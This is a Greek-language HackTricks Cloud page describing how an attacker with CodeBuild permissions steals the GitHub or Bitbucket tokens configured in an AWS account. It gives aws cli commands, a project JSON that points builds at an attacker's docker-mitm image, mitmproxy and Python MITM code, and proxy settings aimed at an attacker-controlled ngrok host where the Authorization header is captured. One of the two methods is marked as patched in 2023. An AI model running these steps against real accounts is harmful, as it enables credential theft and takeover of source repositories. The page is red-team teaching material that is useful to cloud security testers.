# AWS Codebuild - Token Leakage

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Δείτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## Ανακτήστε τα Github/Bitbucket Configured Tokens

Πρώτα, ελέγξτε αν υπάρχουν διαμορφωμένα source credentials που θα μπορούσατε να διαρρεύσετε:
```bash
aws codebuild list-source-credentials
```
### Μέσω Docker Image

Αν διαπιστώσετε ότι η αυθεντικοποίηση για παράδειγμα στο Github είναι ρυθμισμένη στον λογαριασμό, μπορείτε να **εξάγετε** αυτή την **πρόσβαση** (**GH token ή OAuth token**) κάνοντας το Codebuild να **χρησιμοποιήσει μια συγκεκριμένη docker image** για να εκτελέσει την κατασκευή του έργου.

Για αυτόν τον σκοπό μπορείτε να **δημιουργήσετε ένα νέο Codebuild project** ή να αλλάξετε το **περιβάλλον** ενός υπάρχοντος για να ρυθμίσετε την **Docker image**.

Η Docker image που μπορείτε να χρησιμοποιήσετε είναι [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Αυτή είναι μια πολύ βασική Docker image που θα ρυθμίσει τις **env variables `https_proxy`**, **`http_proxy`** και **`SSL_CERT_FILE`**. Αυτό θα σας επιτρέψει να αναχαιτίσετε το μεγαλύτερο μέρος της κυκλοφορίας του host που υποδεικνύεται στα **`https_proxy`** και **`http_proxy`** και να εμπιστευτείτε το SSL CERT που υποδεικνύεται στο **`SSL_CERT_FILE`**.

1. **Δημιουργήστε & Ανεβάστε τη δική σας Docker MitM image**
* Ακολουθήστε τις οδηγίες του repo για να ρυθμίσετε τη διεύθυνση IP του proxy σας και να ρυθμίσετε το SSL cert σας και **δημιουργήστε την docker image**.
* **ΜΗΝ ΡΥΘΜΙΣΕΤΕ το `http_proxy`** για να μην αναχαιτίσετε αιτήματα στο metadata endpoint.
* Μπορείτε να χρησιμοποιήσετε **`ngrok`** όπως `ngrok tcp 4444` για να ρυθμίσετε τον proxy στον host σας.
* Μόλις δημιουργήσετε την Docker image, **ανεβάστε την σε ένα δημόσιο repo** (Dockerhub, ECR...)
2. **Ρυθμίστε το περιβάλλον**
* Δημιουργήστε ένα **νέο Codebuild project** ή **τροποποιήστε** το περιβάλλον ενός υπάρχοντος.
* Ρυθμίστε το project να χρησιμοποιεί την **προηγουμένως δημιουργημένη Docker image**

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Ρυθμίστε τον MitM proxy στον host σας**

* Όπως υποδεικνύεται στο **Github repo** μπορείτε να χρησιμοποιήσετε κάτι σαν:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
Η **έκδοση mitmproxy που χρησιμοποιήθηκε ήταν η 9.0.1**, αναφέρθηκε ότι με την έκδοση 10 αυτό μπορεί να μην λειτουργεί.
{% endhint %}

4. **Εκτελέστε το build & καταγράψτε τα διαπιστευτήρια**

*   Μπορείτε να δείτε το token στην κεφαλίδα **Authorization**:

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

Αυτό θα μπορούσε επίσης να γίνει από το aws cli με κάτι σαν

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~Via HTTP protocol~~

{% hint style="success" %}
**Αυτή η ευπάθεια διορθώθηκε από την AWS κάποια στιγμή την εβδομάδα της 20ης Φεβρουαρίου 2023 (νομίζω την Παρασκευή). Έτσι, ένας επιτιθέμενος δεν μπορεί να την εκμεταλλευτεί πλέον :)**
{% endhint %}

Ένας επιτιθέμενος με **αυξημένα δικαιώματα σε ένα CodeBuild θα μπορούσε να διαρρεύσει το Github/Bitbucket token** που έχει διαμορφωθεί ή αν τα δικαιώματα έχουν διαμορφωθεί μέσω OAuth, το **προσωρινό OAuth token που χρησιμοποιείται για την πρόσβαση στον κώδικα**.

* Ένας επιτιθέμενος θα μπορούσε να προσθέσει τις μεταβλητές περιβάλλοντος **http\_proxy** και **https\_proxy** στο έργο CodeBuild που δείχνουν στη μηχανή του (για παράδειγμα `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

* Στη συνέχεια, αλλάξτε τη διεύθυνση URL του αποθετηρίου github για να χρησιμοποιήσετε HTTP αντί για HTTPS, για παράδειγμα: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* Στη συνέχεια, εκτελέστε το βασικό παράδειγμα από [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) στη θύρα που υποδεικνύεται από τις μεταβλητές proxy (http\_proxy και https\_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Τέλος, κάντε κλικ στο **Build the project**, τα **credentials** θα **σταλούν σε απλό κείμενο** (base64) στη θύρα mitm:

<figure><img src="../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Τώρα ένας επιτιθέμενος θα μπορεί να χρησιμοποιήσει το token από τη μηχανή του, να καταγράψει όλα τα προνόμια που έχει και να τα (κατα)χρησιμοποιήσει πιο εύκολα από το να χρησιμοποιήσει την υπηρεσία CodeBuild απευθείας.
{% endhint %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Δείτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
